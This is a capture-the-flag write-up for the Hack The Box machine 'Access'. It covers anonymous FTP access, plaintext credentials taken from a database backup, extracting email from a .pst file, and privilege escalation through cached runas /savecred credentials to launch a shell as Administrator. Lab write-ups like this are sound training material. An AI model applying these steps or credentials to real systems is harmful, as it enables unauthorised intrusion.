# Access

## Intro

Access is an easy rated windows machine from hack the box.

## Nmap

The following tcp ports are open.

```
21
23
80
```

## FTP

Anonymous login is available. Transferring files gives an error, so the following commands need to be executed first.

```
passive
binary
```

Tranfer the files.

```
backup.mdb
Access Control.zip
```

Using an online site to read the database tables from backup.mdb, the following creds are found.

```
admin:admin
engineer:access4u@security
backup_admin:admin
John Carter:020481
Mark Smith:010101
Sunita Rahman:000000
Mary Jones:666666
Monica Nunes:123321
```

## User

The password access4u@security enables unzipping.

The following command extracts the email from the .pst file.

```
readpst -S  'Access Control.pst'
```

User credentials which allow telnet access.

```
security:4Cc3ssC0ntr0ller
```

## Root

There is a lnk file in the public folder that when type'd shows the runas command used with /savecred.

The following command also shows the credentials have been cached.

```
cmdkey /list
```

After transferring a shell.exe to the machine, execute as administrator.

```
runas /user:ACCESS\Administrator /savecred "C:\Windows\Temp\shell.exe"
```
